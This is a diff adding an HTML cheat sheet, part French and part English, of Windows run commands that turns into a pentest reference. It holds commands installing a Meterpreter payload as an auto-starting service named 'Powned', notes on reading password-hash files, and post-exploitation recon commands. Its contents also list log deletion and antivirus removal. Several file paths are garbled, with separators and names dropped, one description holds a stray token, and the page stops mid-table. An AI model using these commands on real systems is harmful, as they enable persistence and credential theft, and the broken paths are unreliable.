@@ -1,0 +1,1105 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="Content-Style-Type" content="text/css" />
+  <meta name="generator" content="pandoc" />
+  <meta name="author" content="SUBTITLE" />
+  <title>Aide Mémoire</title>
+  <style type="text/css">
+table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
+  margin: 0; padding: 0; vertical-align: baseline; border: none; }
+table.sourceCode { width: 100%; background-color: #f8f8f8; }
+td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
+td.sourceCode { padding-left: 5px; }
+pre, code { background-color: #f8f8f8; }
+code > span.kw { color: #204a87; font-weight: bold; }
+code > span.dt { color: #204a87; }
+code > span.dv { color: #0000cf; }
+code > span.bn { color: #0000cf; }
+code > span.fl { color: #0000cf; }
+code > span.ch { color: #4e9a06; }
+code > span.st { color: #4e9a06; }
+code > span.co { color: #8f5902; font-style: italic; }
+code > span.ot { color: #8f5902; }
+code > span.al { color: #ef2929; }
+code > span.fu { color: #000000; }
+code > span.er { font-weight: bold; }
+  </style>
+  <link rel="stylesheet" href="extra/pandoc.css" type="text/css" />
+</head>
+<body>
+<div id="header">
+<h1 class="title">Aide Mémoire</h1>
+<h2 class="author">SUBTITLE</h2>
+<h3 class="date">USERS</h3>
+</div>
+<div id="TOC">
+<ul>
+<li><a href="#commandes-windows">Commandes Windows</a><ul>
+<li><a href="#propriétés">Propriétés</a></li>
+<li><a href="#programmes-et-outils-windows">Programmes et outils Windows</a></li>
+<li><a href="#gestion-des-disques">Gestion des disques</a></li>
+<li><a href="#gestion-des-réseaux-et-internet">Gestion des réseaux et Internet</a></li>
+<li><a href="#autres-commandes">Autres commandes</a></li>
+<li><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a><ul>
+<li><a href="#activation-dun-utilisateur">activation d’un utilisateur</a></li>
+<li><a href="#désactivation-dun-utilisateur">désactivation d’un utilisateur</a></li>
+</ul></li>
+<li><a href="#gestion-des-services">Gestion des services</a></li>
+<li><a href="#gestion-des-fichiers">Gestion des fichiers</a></li>
+</ul></li>
+<li><a href="#windows-pentest-commands">Windows pentest commands</a><ul>
+<li><a href="#blind-files">Blind Files</a></li>
+<li><a href="#system">System</a></li>
+<li><a href="#networking-ipconfig-netstat-net">Networking (ipconfig, netstat, net)</a></li>
+<li><a href="#configs">Configs</a></li>
+<li><a href="#finding-important-files">FINDING IMPORTANT FILES</a></li>
+<li><a href="#files-to-pull-if-possible">FILES TO PULL (IF POSSIBLE)</a></li>
+<li><a href="#remote-system-access">REMOTE SYSTEM ACCESS</a></li>
+<li><a href="#auto-start-directories">AUTO-START DIRECTORIES</a></li>
+<li><a href="#wmi">WMI</a></li>
+<li><a href="#reg-command">REG COMMAND</a></li>
+<li><a href="#deleting-logs">DELETING LOGS</a></li>
+<li><a href="#uninstalling-software-antivirus-non-interactive">UNINSTALLING SOFTWARE “ANTIVIRUS” (NON INTERACTIVE)</a></li>
+<li><a href="#other-to-be-sorted">OTHER (TO BE SORTED)</a></li>
+<li><a href="#os-specific">OS SPECIFIC</a></li>
+<li><a href="#invasive-or-altering-commands">INVASIVE OR ALTERING COMMANDS</a></li>
+</ul></li>
+<li><a href="#tests">TESTS</a><ul>
+<li><a href="#toto">TOTO</a></li>
+</ul></li>
+<li><a href="#metasploit">Metasploit</a><ul>
+<li><a href="#genration-de-payload-executables">Genration de payload executables</a><ul>
+<li><a href="#manuel">Manuel</a></li>
+<li><a href="#exemple">Exemple</a><ul>
+<li><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></li>
+<li><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></li>
+</ul></li>
+<li><a href="#alternative">Alternative</a></li>
+</ul></li>
+<li><a href="#lancement-de-handler">Lancement de handler</a></li>
+</ul></li>
+<li><a href="#vlc">VLC</a><ul>
+<li><a href="#transcoding">Transcoding</a><ul>
+<li><a href="#vers-mp4">vers MP4</a></li>
+<li><a href="#vers-avi">vers AVI</a></li>
+</ul></li>
+<li><a href="#options-utiles">Options utiles</a></li>
+<li><a href="#net-casting-http">Net casting http</a></li>
+<li><a href="#devices">Devices</a></li>
+</ul></li>
+</ul>
+</div>
+<h1 id="commandes-windows"><a href="#TOC">Commandes Windows</a></h1>
+<h2 id="propriétés"><a href="#TOC">Propriétés</a></h2>
+<ul>
+<li>ACCESS.CPL : ouvre les options d’accessibilité (Pour XP uniquement)</li>
+<li>APPWIZ.CPL : ouvre l’outil Ajouter/Supprimer un programme</li>
+<li>AZMAN.MSC : ouvre le gestionnaire d’autorisations (Pour Vista uniquement)</li>
+<li>CERTMGR.MSC : ouvre les certificats pour l’utilisateur actuel</li>
+<li>CLICONFG : ouvre la configuration des clients SQL</li>
+<li>COLLAB.CPL : ouvre le voisinage immédiat (Pour Vista uniquement)</li>
+<li>COMEXP.MSC ou bien DCOMCNFG : ouvre l’outil services et composants (Pour Vista uniquement)</li>
+<li>COMPMGMT.MSC : ouvre l’outil de gestion de l’ordinateur</li>
+<li>COMPUTERDEFAULTS : ouvrir l’outil des programmes par défaut (Pour Vista uniquement)</li>
+<li>CONTROL /NAME MICROSOFT.BACKUPANDRESTORECENTER : ouvre le centre de sauvegarde et de restauration (Pour Vista uniquement). Tutoriel ICI</li>
+<li>CONTROL ADMINTOOLS : ouvre les outils d’administrations</li>
+<li>CONTROL COLOR : ouvre les paramètres de l’apparence</li>
+<li>CONTROL FOLDERS : ouvre les options de dossiers</li>
+<li>CONTROL FONTS : ouvre le gestionnaire de polices</li>
+<li>CONTROL INTERNATIONAL ou bien INTL.CPL : ouvre les options régionales et linguistiques</li>
+<li>CONTROL KEYBOARD : ouvre les propriétés du clavier</li>
+<li>CONTROL MOUSE ou bien MAIN.CPL : ouvre les propriétés de la souris</li>
+<li>CONTROL PRINTERS : ouvre les imprimantes et les fax disponibles</li>
+<li>CONTROL USERPASSWORDS : ouvre l’éditeur des comptes utilisateurs</li>
+<li>CONTROL USERPASSWORDS2 ou bien NETPLWIZ : contrôle les utilisateurs et leurs accès</li>
+<li>CONTROL : ouvre le panneau de configuration</li>
+<li>CREDWIZ : ouvre l’outil de sauvegarde et restauration des mots de passe des utilisateurs (Pour Vista uniquement)</li>
+<li>DESK.CPL : ouvre les paramètres d’affichage</li>
+<li>DEVMGMT.MSC : ouvre les gestionnaire de périphériques. Tutoriel ICI</li>
+<li>DRWTSN32 : ouvre Dr. Watson (Pour XP uniquement)</li>
+<li>DXDIAG : ouvre l’outil de diagnostic DirectX</li>
+<li>EVENTVWR ou bien EVENTVWR.MSC : ouvre l’observateur d’évènements</li>
+<li>FSMGMT.MSC : ouvre les dossiers partagés</li>
+<li>GPEDIT.MSC : ouvre l’éditeur des stratégies de groupe (Pour les éditions professionnelles et plus de Windows)</li>
+<li>HDWWIZ.CPL : ouvre l’assistant ajout de matériels</li>
+<li>INFOCARDCPL.CPL : ouvre l’assistant compatibilité des programmes</li>
+<li>IRPROPS.CPL : ouvre le gestionnaire d’infrarouge</li>
+<li>ISCSICPL : ouvre l’outil de configuration de l’initiateur ISCI Microsoft (Pour Vista uniquement)</li>
+<li>JOY.CPL : ouvre l’outil de contrôleur de jeu</li>
+<li>LPKSETUP : ouvre l’assistant d’installation et désinstallation des langues d’affichage (Pour Vista uniquement)</li>
+<li>LUSRMGR.MSC : ouvre l’éditeur des utilisateurs et groupes locaux</li>
+<li>MDSCHED : ouvre l’outil de diagnostics de la mémoire Windows (Pour Vista uniquement)</li>
+<li>MMC : ouvre une nouvelle console vide</li>
+<li>MMSYS.CPL : ouvre les paramètres de sons</li>
+<li>MOBSYNC : ouvre le centre de synchronisation</li>
+<li>MSCONFIG : ouvre l’outil de configuration du système</li>
+<li>NAPCLCFG.MSC : ouvre l’outil de configuration du client NAP (Pour Vista uniquement)</li>
+<li>NTMSMGR.MSC : ouvre le gestionnaire des supports de stockage amovibles</li>
+<li>NTMSOPRQ.MSC : ouvre les demandes de l’opérateur de stockage amovible</li>
+<li>ODBCAD32 : ouvre l’administrateur de sources de données ODBC</li>
+<li>OPTIONALFEATURES : ouvre l’outil Ajouter/Supprimer des composants Windows (Pour Vista uniquement)</li>
+<li>PERFMON ou bien PERFMON.MSC : ouvre le moniteur de fiabilité et de performances Windows.</li>
+<li>POWERCFG.CPL : ouvre le gestionnaire des modes d’alimentation (Pour Vista uniquement)</li>
+<li>REGEDIT ou bien REGEDT32 (Pour Vista uniquement) : ouvre l’éditeur de registre</li>
+<li>REKEYWIZ : ouvre le gestionnaire des certificats de chiffrement de fichiers (Pour Vista uniquement)</li>
+<li>RSOP.MSC : ouvre le jeu de stratégie résultant</li>
+<li>SECPOL.MSC : ouvre les paramètres de sécurités locales</li>
+<li>SERVICES.MSC : ouvre le gestionnaire de services</li>
+<li>SLUI : ouvre l’assistant d’activation de Windows (Pour Vista uniquement)</li>
+<li>SYSDM.CPL : ouvre les propriétés système</li>
+<li>SYSEDIT : ouvre l’éditeur de configuration système (Attention, à manipuler avec prudence)</li>
+<li>SYSKEY : ouvre l’utilitaire de protection de la base de données des comptes Windows (Attention, à manipuler avec extrême prudence !)</li>
+<li>SYSPREP: ouvre le dossier contenant l’outil de préparation du système (Pour Vista uniquement)</li>
+<li>TABLETPC.CPL : ouvre les paramètres pour Tablet pc (Pour Vista uniquement)</li>
+<li>TASKSCHD.MSC ou bien CONTROL SCHEDTASKS : ouvre le planificateur de tâches (Pour Vista uniquement)</li>
+<li>TELEPHON.CPL : ouvre l’outil de connexion téléphonique</li>
+<li>TIMEDATE.CPL : ouvre les paramètres de l’heure et de la date</li>
+<li>TPM.MSC : ouvre l’outil gestion de module de plateforme sécurisée sur l’ordinateur local (Pour Vista uniquement)</li>
+<li>UTILMAN : ouvre les options d’ergonomie (Pour Vista uniquement)</li>
+<li>VERIFIER : ouvre le gestionnaire de vérification des pilotes</li>
+<li>WMIMGMT.MSC : ouvre Windows Management Infrastructure</li>
+<li>WSCUI.CPL : ouvre le centre de sécurité Windows</li>
+<li>WUAUCPL.CPL : ouvre le service de mise à jour Windows (Pour XP uniquement)</li>
+</ul>
+<h2 id="programmes-et-outils-windows"><a href="#TOC">Programmes et outils Windows</a></h2>
+<ul>
+<li>WINDIR%32.EXE : ouvre l’outil de restauration de système (Pour XP uniquement). Tutoriel ICI</li>
+<li>CALC : ouvre la calculatrice</li>
+<li>CHARMAP : ouvre la table des caractères</li>
+<li>CLIPBRD : ouvre le presse papier (Pour XP uniquement, pour l’ajouter à Vista voir ICI)</li>
+<li>CMD : ouvre l’invite de commandes</li>
+<li>DIALER : ouvre le numérateur téléphonique de Windows</li>
+<li>DVDPLAY : ouvre votre lecteur DVD</li>
+<li>EUDCEDIT : ouvre l’éditeur de caractères privés</li>
+<li>EXPLORER : ouvre l’explorateur Windows</li>
+<li>FSQUIRT : Assistant transfert Bluetooth</li>
+<li>IEXPLORE : ouvre Internet Explorer</li>
+<li>IEXPRESS : ouvre l’assistant de création des archives auto-extractibles. Tutoriel ICI</li>
+<li>JOURNAL : ouvre un nouveau journal (Pour Vista uniquement)</li>
+<li>MAGNIFY : ouvre la loupe</li>
+<li>MBLCTR : ouvre le centre de mobilité de Windows (Pour Vista uniquement)</li>
+<li>MIGWIZ : ouvre l’outil de transfert de fichiers et de paramètres Windows (Pour Vista uniquement)</li>
+<li>MIGWIZ.EXE : ouvre l’outil de transfert de fichiers et de paramètres Windows (pour XP uniquement)</li>
+<li>MOVIEMK : ouvre Windows Movie Maker</li>
+<li>MRT : lance l’utilitaire de suppression de logiciel malveillant. Tutoriel ICI</li>
+<li>MSDT : ouvre l’outil de diagnostics et support Microsoft</li>
+<li>MSINFO32 : ouvre les informations système</li>
+<li>MSPAINT : ouvre Paint</li>
+<li>MSRA : ouvre l’assistance à distance Windows</li>
+<li>MSTSC : ouvre l’outil de connexion du bureau a distance</li>
+<li>NOTEPAD : ouvre le bloc-notes</li>
+<li>OSK : ouvre le clavier visuel. Tutoriel ICI</li>
+<li>PRINTBRMUI : ouvre l’assistant de migration d’imprimante (Vista uniquement)</li>
+<li>RSTRUI : ouvre l’outil de restauration du système (Pour Vista uniquement)</li>
+<li>SIDEBAR : ouvre le volet Windows (Pour Vista uniquement)</li>
+<li>SIGVERIF : ouvre l’outil de vérification des signatures de fichiers</li>
+<li>SNDVOL : ouvre le mélangeur de volume</li>
+<li>SNIPPINGTOOL : ouvre l’outil capture d’écran (Pour Vista uniquement). Tutoriel ICI</li>
+<li>SOUNDRECORDER : ouvre le magnétophone</li>
+<li>STIKYNOT : ouvre le pense-bête (Pour Vista uniquement)</li>
+<li>TABTIP : ouvre le panneau de saisie Tablet PC (Pour Vista uniquement)</li>
+<li>TASKMGR : ouvre le gestionnaire des tâches Windows</li>
+<li>WAB : ouvre les contacts (Pour Vista uniquement)</li>
+<li>WERCON : ouvre l’outil de rapports et de solutions aux problèmes (Pour Vista uniquement)</li>
+<li>WINCAL : ouvre le calendrier Windows (Pour Vista uniquement)</li>
+<li>WINCHAT : ouvre le logiciel Microsoft de chat en réseau (Pour Windows XP uniquement)</li>
+<li>WINDOWSANYTIMEUPGRADE : permet la mise à niveau de Windows Vista</li>
+<li>WINVER : ouvre la fenêtre pour connaître votre version Windows</li>
+<li>WINWORD: ouvre Word (si il est installé)</li>
+<li>WMPLAYER : ouvre le lecteur Windows Media</li>
+<li>WRITE ou bien Wordpad : ouvre Wordpad</li>
+</ul>
+<h2 id="gestion-des-disques"><a href="#TOC">Gestion des disques</a></h2>
+<ul>
+<li>CHKDSK : effectue une analyse de la partition précisée dans les paramètres de la commande (Pour plus d’informations, tapez CHKDSK /? dans l’invite de commande CMD)</li>
+<li>CLEANMGR : ouvre l’outil de nettoyage de disque</li>
+<li>DEFRAG: Défragmente le disque dur (pour savoir comment utiliser, c’est ici )</li>
+<li>DFRG.MSC : ouvre l’outil de défragmentation de disque</li>
+<li>DISKMGMT.MSC : ouvre le gestionnaire de disques</li>
+<li>DISKPART : ouvre l’outil de partitionnement (un peu lourd à manipuler)</li>
+</ul>
+<h2 id="gestion-des-réseaux-et-internet"><a href="#TOC">Gestion des réseaux et Internet</a></h2>
+<ul>
+<li>CONTROL NETCONNECTIONS ou bien NCPA.CPL : ouvre les connexions réseau</li>
+<li>FIREWALL.CPL : ouvre le pare-feu Windows</li>
+<li>INETCPL.CPL : ouvre les propriétés internet</li>
+<li>IPCONFIG : affiche les configurations des adresses IP sur l’ordinateur (Pour plus d’informations, tapez IPCONFIG /? dans l’invite de commande CMD)</li>
+<li>NETSETUP.CPL : ouvre l’assistant configuration réseau (Pour XP uniquement)</li>
+<li>WF.MSC : ouvre les fonctions avancées du pare-feu Windows (Pour Vista uniquement). Tutoriel ICI</li>
+<li>À VOIR ÉGALEMENT : Commandes IP relatives aux réseaux sous Windows</li>
+</ul>
+<h2 id="autres-commandes"><a href="#TOC">Autres commandes</a></h2>
+<ul>
+<li>%HOMEDRIVE% : ouvre l’explorateur sur la partition ou le système d’exploitation est installé</li>
+<li>%HOMEPATH% : ouvre le dossier d’utilisateur connecté actuellement C:and settings[nom d’utilisateur]</li>
+<li>%PROGRAMFILES% : ouvre le dossier d’installation d’autres programmes (Program Files)</li>
+<li>%TEMP% ou bien %TMP% : ouvre le dossier temporaire</li>
+<li>%USERPROFILE% : ouvre le dossier du profil de l’utilisateur connecté actuellement</li>
+<li>%WINDIR% ou bien %SYSTEMROOT% : ouvre le dossier d’installation de Windows</li>
+<li>%WINDIR%3232.exe shell32.dll,Control_RunDLL hotplug.dll : affiche la fenêtre “Supprimer le périphérique en toute sécurité”</li>
+<li>AC3FILTER.CPL : ouvre les propriétés du filtre AC3 (Si installé)</li>
+<li>FIREFOX : lance Mozilla FireFox (Si installé)</li>
+<li>JAVAWS : Visualise le cache du logiciel JAVA (Si installé)</li>
+<li>LOGOFF : ferme la session actuelle</li>
+<li>NETPROJ : autorise ou pas la connexion à un projecteur réseau (Pour Vista uniquement)</li>
+<li>Vérificateur des fichiers système (Nécessite un CD de Windows si le cache n’est pas disponible): (Tutoriel ICI)</li>
+<li>SFC /SCANNOW : scanne immédiatement tous les fichiers système et répare les fichiers endommagés</li>
+<li>SFC /VERIFYONLY : scanne seulement les fichiers système</li>
+<li>SFC /SCANFILE=“nom et chemin de fichier” : scanne le fichier précisé, et le répare s’il est endommagé</li>
+<li>SFC /VERIFYFILE=“nom et chemin de fichier” : scanne seulement le fichier précisé</li>
+<li>SFC /SCANONCE : scanne les fichiers système au prochain redémarrage</li>
+<li>SFC /REVERT : remet la configuration initiale (Pour plus d’informations, tapez SFC /? dans l’invite de commande CMD.</li>
+<li>SHUTDOWN : éteint Windows</li>
+<li>SHUTDOWN –A : interrompe l’arrêt de Windows</li>
+<li>VSP1CLN : supprime le cache d’installation du service pack 1 de Vista (Tutoriel ICI)</li>
+</ul>
+<h2 id="gestion-des-utilisateurs"><a href="#TOC">Gestion des utilisateurs</a></h2>
+<h3 id="activation-dun-utilisateur"><a href="#TOC">activation d’un utilisateur</a></h3>
+<pre><code>net users sysadmin /active:yes</code></pre>
+<h3 id="désactivation-dun-utilisateur"><a href="#TOC">désactivation d’un utilisateur</a></h3>
+<pre><code>net users sysadmin /active:no</code></pre>
+<h2 id="gestion-des-services"><a href="#TOC">Gestion des services</a></h2>
+<pre><code>sc create Powned binPath# &quot;C:\Meterpreter.exe&quot;
+sc config Powned start# auto
+net start Powned
+sc delete Powned</code></pre>
+<h2 id="gestion-des-fichiers"><a href="#TOC">Gestion des fichiers</a></h2>
+<pre><code>xcopy Meterpreter.exe c:\</code></pre>
+<h1 id="windows-pentest-commands"><a href="#TOC">Windows pentest commands</a></h1>
+<h2 id="blind-files"><a href="#TOC">Blind Files</a></h2>
+<table style="border-collapse: collapse; border: medium none;">
+<colgroup><col width="251"></col><col width="421"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">File</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"></span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Contents / Description</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"></span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMDRIVE%.ini</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%.ini</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This is another file to look for if boot.ini isn’t there or coming back, which is some times the case.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMROOT%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">It stores users’ passwords in a hashed format (in</span><span style="font-size: small;"><a href="https://secure.wikimedia.org/wikipedia/en/wiki/LM_hash"><span style="background-color: transparent; color: black; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #000099; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: underline; vertical-align: baseline;">LM hash</span></a></span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> and</span><span style="font-size: small;"><a href="https://secure.wikimedia.org/wikipedia/en/wiki/NTLM"><span style="background-color: transparent; color: black; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> </span><span style="background-color: transparent; color: #000099; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: underline; vertical-align: baseline;">NTLM</span></a></span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"> hash).</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMROOT%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">&gt;insert new rows above this line&lt;</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">SEE IMPORTANT FILES SECTION FOR MORE IDEAS</span>
+</td></tr>
+</tbody></table>
+
+<h2 id="system"><a href="#TOC">System</a></h2>
+<table style="border-collapse: collapse; border: medium none;">
+<colgroup><col width="334"></col><col width="338"></col></colgroup>
+<tbody>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Output or Description</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">whoami</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">whoami /all</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists current user, sid, groups current user is a member of and their sids as well as current privilege level.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">set</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">systeminfo (XP+)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Outputs a large amount of data about the sytem, including hostname, domain, logon server, time zone, network interface config, and hotfixes installed</span>
+</td></tr>
+<tr style="height: 60px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qwinsta</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: italic; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">(2000/NT4 with Terminal Services; XP and above)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displaying information about RDP sessions. /CONNECT can be added, but usually not. needed to gain the information you need.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qprocess *</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Much like tasklist, but a bit easier to read. It has username, login mqappsrvethod, session id, pid, and binary name. </span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="font-size: small;"><br /> </span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">lists Terminal Services servers</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">at</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Shows currently scheduled tasks via ‘at’. Even though schtasks is the new way of doing things admin wise, pentesters can still use ‘at’ to get system level shells even through Win7x64 systems.</span>
+</td></tr>
+<tr style="height: 89px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">schtasks (XP+)</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all the currently scheduled tasks that your current user has access to see. This is the big deviation from ‘at’. Each user can have their own scheduled tasks now.</span>
+</td></tr>
+<tr style="height: 43px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">schtasks /query /fo csv /v &gt; %TEMP%</span>
+</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Outputs the list of services in verbose csv format. Good for throwing in temp and pulling down for a more closer look.</span>
+</td></tr>
+<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
+<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net start</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">OR</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc query</span>
